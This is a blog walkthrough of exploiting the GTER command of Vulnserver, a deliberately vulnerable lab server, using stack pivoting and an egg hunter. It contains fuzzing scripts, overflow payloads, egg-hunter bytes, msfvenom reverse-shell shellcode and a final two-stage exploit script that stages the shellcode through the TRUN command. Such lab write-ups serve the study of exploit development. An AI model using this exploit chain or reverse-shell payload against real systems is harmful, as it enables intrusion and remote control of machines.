---
title: "Vulnserver GTER - Staged exploitation and Egg hunting"
classes: wide
tag: 
  - "windows exploitation"
  - "vulnserver"
header:
  teaser: /assets/images/win-exp/windows-exp.png
ribbon: blue
description: "A simple walkthrough on  Vulnserver GTER using egg hunter and staged exploitation technique"
categories: ['Exploit-Development','Windows-Exploitation','Vulnserver']
---

- [Vulnserver GTER - Stack pivoting & Egg hunting](#vulnserver-gter---stack-pivoting--egg-hunting)
  - [Prologue](#prologue)
  - [Spiking the Vulnserver](#spiking-the-vulnserver)
  - [Analysing the source code](#analysing-the-source-code)
  - [Fuzzing the server](#fuzzing-the-server)
  - [Finding offset](#finding-offset)
  - [Overwriting Instruction Pointer](#overwriting-instruction-pointer)
  - [Finding bad characters](#finding-bad-characters)
  - [Redirecting code execution](#redirecting-code-execution)
  - [Stack pivoting](#stack-pivoting)
  - [Crafting egg hunter](#crafting-egg-hunter)
  - [Crafting shellcode](#crafting-shellcode)
  - [Staging shellcode](#staging-shellcode)
  - [Exploitation](#exploitation)

## Prologue

In this blog post, will discuss about ```GTER``` command from Vulnserver, where we will be exploiting it by using ```stack pivoting``` and ```egg hunting``` 

## Spiking the Vulnserver

Creating a ```spike script``` for spiking using ```generic_send_tcp```,

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver/GTER]
└─$ cat gter.spk 
s_readline();
s_string("GTER ");
s_string_variable("0");
                                                                       
┌──(kali㉿aidenpearce369)-[~/vulnserver/GTER]
└─$ generic_send_tcp 192.168.116.140 9999 gter.spk 0 0 
Total Number of Strings is 681
Fuzzing
Fuzzing Variable 0:0
line read=Welcome to Vulnerable Server! Enter HELP for help.
Fuzzing Variable 0:1
Variablesize= 5004
Fuzzing Variable 0:2
Variablesize= 5005

...

```

While spiking GTER command, we could see that we could not connect to the Vulnserver anymore

Yes.. It got crashed!!

We could see that our Vulnserver application has been terminated by ```Access Violation error```

From this we can confirm that, ```GTER``` command is vulnerable to Buffer Overflow attack

## Analysing the source code

The source code for this command is,

```c
 else if (strncmp(RecvBuf, "GTER ", 5) == 0) {
				char *GterBuf = malloc(180);
				memset(GdogBuf, 0, 1024);
				strncpy(GterBuf, RecvBuf, 180);				
				memset(RecvBuf, 0, DEFAULT_BUFLEN);
				Function1(GterBuf);
				SendResult = send( Client, "GTER ON TRACK\n", 14, 0 );
			}
```

It copies only ```180 bytes``` of our data into ```GterBuf``` by using ```strncpy()```

```strncpy()``` is not vulnerable, but we have only ```small buffer space``` which becomes a constraint for us

After storing these, it invokes the vulnerable function ```Function1(GterBuf)```

The souce code of this vulnerable function is,

```c
void Function1(char *Input) {
	char Buffer2S[140];
	strcpy(Buffer2S, Input);
}
```

Here the main overflow attack is caused by ```strcpy``` function, where ```Buffer2S``` is only limited for 140 bytes but the incoming buffer has more data (180 bytes) than that causing it to overflow the Buffer2S buffer while copying

This command does not expects any special character used for validation

## Fuzzing the server

We have successfully crashed our server and the payload data begins with ```GTER ``` which is made up of ```5 bytes```

Lets create a python script which generates payload data and fuzzes the payload length to crash the server

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver/GTER]
└─$ cat fuzzing.py
import socket, sys
from time import sleep
payload=b"A"*100
while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("192.168.116.140", 9999))
        s.send((b"GTER "+payload))
        sleep(5)
        payload=payload+b"A"*100
    except:
        print("Fuzzing crashed at %s bytes"%(len(payload)))
        sys.exit()
                                                                       
┌──(kali㉿aidenpearce369)-[~/vulnserver/GTER]
└─$ python3 fuzzing.py
Fuzzing crashed at 300 bytes
```

The Vulnserver application should be ran without debugger, to avoid socket connection errors while fuzzing

So, from fuzzing we can estimate that our Vulnserver application is crashing at ```300 bytes``` of buffer data

Still, we are not sure about the approximate buffer space data need to create an overflow

## Finding offset

Creating pattern using ```metasploit```,

```c
┌──(kali㉿aidenpearce369)-[~]
└─$ msf-pattern_create -l 300 
<GENERATED PATTERN>
```

Fuzzing with the pattern to crash the program,

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver/GTER]
└─$ cat offset.py       
import socket, sys
pattern=b"<GENERATED PATTERN>"
payload=b""
# fuzzing for EIP offset
payload+=pattern
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.140", 9999))
s.send((b"GTER ./"+payload))
s.close()
sys.exit()
                                                                       
┌──(kali㉿aidenpearce369)-[~/vulnserver/GTER]
└─$ python3 offset.py       
```

This will crash the program, where our buffer will get overflowed and fills the Base Pointer and Instruction Pointer with the data from the pattern

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/gter-offset-reg.png" style="width:40%">
</div>

Here we can see ```EIP``` has a data from the pattern we created, we can also use metasploit to find the offset

Lets find the offset using mona by ```!mona findmsp```,

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/gter-offset-findmsp.png">
</div>

We can see that our ```EIP``` is at the offset of ```151 bytes``` in the pattern

So we should use 5 bytes of ```GTER ``` and 151 bytes of ```A's``` to reach ```EIP```

## Overwriting Instruction Pointer

Now, we have found the offset of our EIP

It’s time to control the EIP, which is the important phase of every exploitation

Lets craft a script to overwrite the EIP with our own custom data, which will be further used to craft an exploit,

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver/GTER]
└─$ cat overwrite-eip.py 
import socket, sys
payload=b""
# to overwrite buffer and EBP
payload+=b"A"*151
# to overwrite EIP
payload+=b"D"*4
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.140", 9999))
s.send((b"GTER "+payload))
s.close()
sys.exit()
                                                                       
┌──(kali㉿aidenpearce369)-[~/vulnserver/GTER]
└─$ python3 overwrite-eip.py 
```

We have successfully overwrote the ```EIP``` with our own data ```0x44444444```

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/gter-overwrite-offset.png" style="width:40%">
</div>

So we could control EIP and redirect the code execution to the next point

## Finding bad characters

Lets pass bad characters on our ```ESP``` memory to see our data dump on that region

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver/GTER]
└─$ cat badchars.py     
import socket, sys
# collection of badchars except \x00
badchars=(b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
payload=b""
# to overwrite buffer and EBP
payload+=b"A"*151
# to overwrite EIP
payload+=b"B"*4
# fuzzing badchars on ESP
payload+=badchars
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.140", 9999))
s.send((b"GTER "+payload))
s.close()
sys.exit()
                                                                       
┌──(kali㉿aidenpearce369)-[~/vulnserver/GTER]
└─$ python3 badchars.py      
```

It seems like, we don't have enough space to store all bad characters in ESP

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/gter-badchars-offset.png">
</div>

We could pass limited set of bad characters again and again in sequence to test it

Or we could store that ```before EIP (EAX - Buffer data)``` and test it

Anyways, by testing in this method we could confirm there are no bad characters except ```null byte```

## Redirecting code execution

As for now, we can control the ```EIP``` and also we have only one ```bad character x00```,

Since we can control ```EIP```, we can use this as our advantage and redirect the code flow to any part of the memory where it is perfect to have shellcode execution along with our egg hunter

Lets find the perfect module for ```JMP ESP``` to get perfect redirection using ```!mona modules```,

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/gter-mona-modules.png">
</div>

On these, we can clearly see that only ```two modules``` have every security mitigations turned off

From these two, it is always best to try our exploit from an DLL of the own application and not from the actual exe itself

Lets find the ```jmp esp``` opcode from the memory of ```essfunc.dll```

To find the opcode using mona, we need the hex value of the opcode which can be done by ```nasm shell```

```c
┌──(kali㉿aidenpearce369)-[~]
└─$ locate nasm_shell
/usr/bin/msf-nasm_shell
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
                                                                       
┌──(kali㉿aidenpearce369)-[~]
└─$ /usr/bin/msf-nasm_shell
nasm > jmp esp
00000000  FFE4              jmp esp
nasm > exit
```

Finding this offset using mona by the command ```!mona find -s \xff\xe4 -m essfunc.dll```,

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/gter-mona-jmpesp.png">
</div>

We could see there are 9 pointers available for this exploit which has ```jmp esp``` opcode in it and it also doesn’t change its memory address

Eventhough ```ASLR``` is enabled for other parts, here it is disabled which makes the address to remain static & suitable for exploitation

```NX bit``` is also disabled, which allows us to execute shellcode on stack memory

Also, while checking the pointer addresses make sure that the address do not contain bad characters in it, which may cause poor exploitation

Lets craft the script and enter the address of the opcode in ```little endian``` format because the data in stack is placed in little endian format

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver/GTER]
└─$ cat jmp-esp.py    
import socket, sys
payload=b""
# to overwrite buffer and EBP
payload+=b"A"*151
# to overwrite EIP with JMP ESP
payload+=b"\xaf\x11\x50\x62"
# padding
payload+=b"D"*4
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.140", 9999))
s.send((b"GTER "+payload))
s.close()
sys.exit()
                                                                       
┌──(kali㉿aidenpearce369)-[~/vulnserver/GTER]
└─$ python3 jmp-esp.py
```

After crashing, we can see that we landed perfectly on ESP memory

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/gter-jmpesp-reg.png" style="width:40%">
</div>

So, we have successfully redirected our program flow

Next we have to point it with our shellcode

But the main constraint here is our buffer size, it is so small to fit our shellcode in it

What we can do is, place an ```egg hunter / opcodes for re-using socket``` to get the ```second stage shellcode``` to exploit the program

In this blog we will try to exploit this by using ```egg hunter```

## Stack pivoting

Since we are going to use ```egg hunter``` for this exploit, we need to store it somewhere

ESP has small size, so we need to place it in our buffer data and use ```short jump/ long jump``` to get back there

Lets try to land on 10th byte of buffer data which has ```5 bytes``` of ```GTER ``` first and extra 5 bytes of junk after it (Use NOPs for better working exploit) 

Our buffer data is being stored in ```EAX```, you can verify it using registers

Lets create the opcode value to drift back to EAX register using nasm-shell,

```c
┌──(kali㉿aidenpearce369)-[~]
└─$ /usr/bin/msf-nasm_shell
nasm > add eax,0x10
00000000  83C010            add eax,byte +0x10
nasm > jmp eax
00000000  FFE0              jmp eax
```

Adding this opcode in our python script,

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver/GTER]
└─$ cat stack-pivot.py 
import socket, sys
payload=b""
# to overwrite buffer and EBP
payload+=b"A"*151
# to overwrite EIP with JMP ESP
payload+=b"\xaf\x11\x50\x62"
# stack pivot
payload+=b"\x90"
payload+=b"\x83\xc0\x10"
payload+=b"\xff\xe0"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.140", 9999))
s.send((b"GTER "+payload))
s.close()
sys.exit()
                                                                       
┌──(kali㉿aidenpearce369)-[~/vulnserver/GTER]
└─$ python3 stack-pivot.py 
```

After crashing the server, we can see this after executing ```JMP ESP```

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/gter-shortjump-opcode.png">
</div>

Here we can see the opcode for the ```long jump to EAX register``` that we have crafted

After proceeding with step intos from ```JMP ESP```, we will hit the jump instruction and will be redirected here

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/gter-shortjump-jump.png">
</div>

We have landed successfully past 10 bytes in the buffer data memory which we have sent

## Crafting egg hunter

We have used ```jmp eax``` to reach the buffer data memory, which is the perfect place to store our ```egg hunter```

Lets craft an egg hunter using ```!mona egg -t PWND -wow64 -winver 10```,

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/gter-mona-egg.png">
</div>

Now we have crafted our egg hunter of ```50 bytes```, lets place it in our python script and lets test it whether we are able to reach it after ```jmp eax```

Lets add ```NOPS sled``` before egg hunter to reach it effectively

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver/GTER]
└─$ cat egg-hunter.py 
import socket, sys
egg_hunter=b""
egg_hunter+=b"\x33\xd2\x66\x81\xca\xff\x0f\x33\xdb\x42\x53\x53\x52\x53\x53\x53"
egg_hunter+=b"\x6a\x29\x58\xb3\xc0\x64\xff\x13\x83\xc4\x0c\x5a\x83\xc4\x08\x3c"
egg_hunter+=b"\x05\x74\xdf\xb8\x50\x57\x4e\x44\x8b\xfa\xaf\x75\xda\xaf\x75\xd7"
egg_hunter+=b"\xff\xe7"
payload=b""
# to overwrite buffer and EBP
# NOP sled
payload+=b"\x90"*40 
# egg hunter
payload+=egg_hunter
payload+=b"C"*(151-len(payload))
# to overwrite EIP with JMP ESP
payload+=b"\xaf\x11\x50\x62"
# stack pivot
payload+=b"\x90"
payload+=b"\x83\xc0\x10"
payload+=b"\xff\xe0"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.140", 9999))
s.send((b"GTER "+payload))
s.close()
sys.exit()
                                                                       
┌──(kali㉿aidenpearce369)-[~/vulnserver/GTER]
└─$ python3 egg-hunter.py
```

After analysing it with break points, we can see that we are ahead of our egg hunter with NOPS sled which will execute perfectly

## Crafting shellcode

Lets generate the shellcode for our reverse shell using ```msfvenom```,

```c
┌──(kali㉿aidenpearce369)-[~]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.116.128 LPORT=9876 -f python -e x86/shikata_ga_nai -b "\x00"
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1712 bytes
buf =  b""
buf += b"\xd9\xc6\xd9\x74\x24\xf4\xbe\x4b\x0e\xc3\xd4\x58\x33"
buf += b"\xc9\xb1\x52\x31\x70\x17\x83\xe8\xfc\x03\x3b\x1d\x21"
buf += b"\x21\x47\xc9\x27\xca\xb7\x0a\x48\x42\x52\x3b\x48\x30"
buf += b"\x17\x6c\x78\x32\x75\x81\xf3\x16\x6d\x12\x71\xbf\x82"
buf += b"\x93\x3c\x99\xad\x24\x6c\xd9\xac\xa6\x6f\x0e\x0e\x96"
buf += b"\xbf\x43\x4f\xdf\xa2\xae\x1d\x88\xa9\x1d\xb1\xbd\xe4"
buf += b"\x9d\x3a\x8d\xe9\xa5\xdf\x46\x0b\x87\x4e\xdc\x52\x07"
buf += b"\x71\x31\xef\x0e\x69\x56\xca\xd9\x02\xac\xa0\xdb\xc2"
buf += b"\xfc\x49\x77\x2b\x31\xb8\x89\x6c\xf6\x23\xfc\x84\x04"
buf += b"\xd9\x07\x53\x76\x05\x8d\x47\xd0\xce\x35\xa3\xe0\x03"
buf += b"\xa3\x20\xee\xe8\xa7\x6e\xf3\xef\x64\x05\x0f\x7b\x8b"
buf += b"\xc9\x99\x3f\xa8\xcd\xc2\xe4\xd1\x54\xaf\x4b\xed\x86"
buf += b"\x10\x33\x4b\xcd\xbd\x20\xe6\x8c\xa9\x85\xcb\x2e\x2a"
buf += b"\x82\x5c\x5d\x18\x0d\xf7\xc9\x10\xc6\xd1\x0e\x56\xfd"
buf += b"\xa6\x80\xa9\xfe\xd6\x89\x6d\xaa\x86\xa1\x44\xd3\x4c"
buf += b"\x31\x68\x06\xc2\x61\xc6\xf9\xa3\xd1\xa6\xa9\x4b\x3b"
buf += b"\x29\x95\x6c\x44\xe3\xbe\x07\xbf\x64\x01\x7f\xcb\xf4"
buf += b"\xe9\x82\x33\xd3\x7d\x0b\xd5\x71\x6e\x5a\x4e\xee\x17"
buf += b"\xc7\x04\x8f\xd8\xdd\x61\x8f\x53\xd2\x96\x5e\x94\x9f"
buf += b"\x84\x37\x54\xea\xf6\x9e\x6b\xc0\x9e\x7d\xf9\x8f\x5e"
buf += b"\x0b\xe2\x07\x09\x5c\xd4\x51\xdf\x70\x4f\xc8\xfd\x88"
buf += b"\x09\x33\x45\x57\xea\xba\x44\x1a\x56\x99\x56\xe2\x57"
buf += b"\xa5\x02\xba\x01\x73\xfc\x7c\xf8\x35\x56\xd7\x57\x9c"
buf += b"\x3e\xae\x9b\x1f\x38\xaf\xf1\xe9\xa4\x1e\xac\xaf\xdb"
buf += b"\xaf\x38\x38\xa4\xcd\xd8\xc7\x7f\x56\xe8\x8d\xdd\xff"
buf += b"\x61\x48\xb4\xbd\xef\x6b\x63\x81\x09\xe8\x81\x7a\xee"
buf += b"\xf0\xe0\x7f\xaa\xb6\x19\xf2\xa3\x52\x1d\xa1\xc4\x76"
```

We have crafted our shellcode which is made up of ```351 bytes``` and it is almost impossible to send our payload in buffer data or in ESP

So lets use a ```staging exploitation technique``` to send this payload

## Staging shellcode

Since we are using ```egg hunters``` to find the shellcode, it is mandatory that the shellcode should be found within the ```Virtual Address Space``` of the process

We can execute our shellcode in the VAS of the same process by,

- ```FIRST STAGE``` - Sending the shellcode with other commands which utilizes large buffer space to store the shellcode
- The shellcode sent will be saved in the memory
- ```SECOND STAGE``` - Sending our egg hunter after that, using our buffer data in which we have control to hunt the shellcode
- The egg hunter analyses the EGG in VAS memory and makes the shellcode to get executed

By seeing the source code, ```TRUN``` command  will be suitable for storing the first staged payload

```c
else if (strncmp(RecvBuf, "TRUN ", 5) == 0) {
				char *TrunBuf = malloc(3000);
				memset(TrunBuf, 0, 3000);
				for (i = 5; i < RecvBufLen; i++) {
					if ((char)RecvBuf[i] == '.') {
						strncpy(TrunBuf, RecvBuf, 3000);				
						Function3(TrunBuf);
						break;
					}
				}
				memset(TrunBuf, 0, 3000);				
				SendResult = send( Client, "TRUN COMPLETE\n", 14, 0 );
			}
```

When we pass our payload inside this, we can use our egg hunter to hunt for the shellcode because it will be in the same VAS

## Exploitation

The exploit script for this buffer overflow via ```GTER``` command is,

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver/GTER]
└─$ cat exploit.py    
import socket, sys
from time import sleep

egg=b"PWNDPWND"

egg_hunter=b""
egg_hunter+=b"\x33\xd2\x66\x81\xca\xff\x0f\x33\xdb\x42\x53\x53\x52\x53\x53\x53"
egg_hunter+=b"\x6a\x29\x58\xb3\xc0\x64\xff\x13\x83\xc4\x0c\x5a\x83\xc4\x08\x3c"
egg_hunter+=b"\x05\x74\xdf\xb8\x50\x57\x4e\x44\x8b\xfa\xaf\x75\xda\xaf\x75\xd7"
egg_hunter+=b"\xff\xe7"

buf =  b""
buf += b"\xd9\xc6\xd9\x74\x24\xf4\xbe\x4b\x0e\xc3\xd4\x58\x33"
buf += b"\xc9\xb1\x52\x31\x70\x17\x83\xe8\xfc\x03\x3b\x1d\x21"
buf += b"\x21\x47\xc9\x27\xca\xb7\x0a\x48\x42\x52\x3b\x48\x30"
buf += b"\x17\x6c\x78\x32\x75\x81\xf3\x16\x6d\x12\x71\xbf\x82"
buf += b"\x93\x3c\x99\xad\x24\x6c\xd9\xac\xa6\x6f\x0e\x0e\x96"
buf += b"\xbf\x43\x4f\xdf\xa2\xae\x1d\x88\xa9\x1d\xb1\xbd\xe4"
buf += b"\x9d\x3a\x8d\xe9\xa5\xdf\x46\x0b\x87\x4e\xdc\x52\x07"
buf += b"\x71\x31\xef\x0e\x69\x56\xca\xd9\x02\xac\xa0\xdb\xc2"
buf += b"\xfc\x49\x77\x2b\x31\xb8\x89\x6c\xf6\x23\xfc\x84\x04"
buf += b"\xd9\x07\x53\x76\x05\x8d\x47\xd0\xce\x35\xa3\xe0\x03"
buf += b"\xa3\x20\xee\xe8\xa7\x6e\xf3\xef\x64\x05\x0f\x7b\x8b"
buf += b"\xc9\x99\x3f\xa8\xcd\xc2\xe4\xd1\x54\xaf\x4b\xed\x86"
buf += b"\x10\x33\x4b\xcd\xbd\x20\xe6\x8c\xa9\x85\xcb\x2e\x2a"
buf += b"\x82\x5c\x5d\x18\x0d\xf7\xc9\x10\xc6\xd1\x0e\x56\xfd"
buf += b"\xa6\x80\xa9\xfe\xd6\x89\x6d\xaa\x86\xa1\x44\xd3\x4c"
buf += b"\x31\x68\x06\xc2\x61\xc6\xf9\xa3\xd1\xa6\xa9\x4b\x3b"
buf += b"\x29\x95\x6c\x44\xe3\xbe\x07\xbf\x64\x01\x7f\xcb\xf4"
buf += b"\xe9\x82\x33\xd3\x7d\x0b\xd5\x71\x6e\x5a\x4e\xee\x17"
buf += b"\xc7\x04\x8f\xd8\xdd\x61\x8f\x53\xd2\x96\x5e\x94\x9f"
buf += b"\x84\x37\x54\xea\xf6\x9e\x6b\xc0\x9e\x7d\xf9\x8f\x5e"
buf += b"\x0b\xe2\x07\x09\x5c\xd4\x51\xdf\x70\x4f\xc8\xfd\x88"
buf += b"\x09\x33\x45\x57\xea\xba\x44\x1a\x56\x99\x56\xe2\x57"
buf += b"\xa5\x02\xba\x01\x73\xfc\x7c\xf8\x35\x56\xd7\x57\x9c"
buf += b"\x3e\xae\x9b\x1f\x38\xaf\xf1\xe9\xa4\x1e\xac\xaf\xdb"
buf += b"\xaf\x38\x38\xa4\xcd\xd8\xc7\x7f\x56\xe8\x8d\xdd\xff"
buf += b"\x61\x48\xb4\xbd\xef\x6b\x63\x81\x09\xe8\x81\x7a\xee"
buf += b"\xf0\xe0\x7f\xaa\xb6\x19\xf2\xa3\x52\x1d\xa1\xc4\x76"

stage1_payload=b""
stage1_payload+=egg
stage1_payload+=buf

stage2_payload=b""
stage2_payload+=b"\x90"*40
stage2_payload+=egg_hunter
stage2_payload+=b"C"*(151-len(stage2_payload))
stage2_payload+=b"\xaf\x11\x50\x62"
stage2_payload+=b"\x90"
stage2_payload+=b"\x83\xc0\x10"
stage2_payload+=b"\xff\xe0"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.140", 9999))
s.send((b"TRUN /.:/"+stage1_payload))
print("[+] Stage 1 payload sent")
s.close()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.140", 9999))
s.send((b"GTER "+stage2_payload))
print("[+] Stage 2 payload sent")
s.close()

print("[+] Exploit complete.. Shell spawned")
```

By running this exploit, we would successfully spawn a reverse shell by executing our shellcode

<video width="100%" preload="auto" muted controls>
    <source src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/gter-1-exploit.mp4" type="video/mp4"/>
</video>


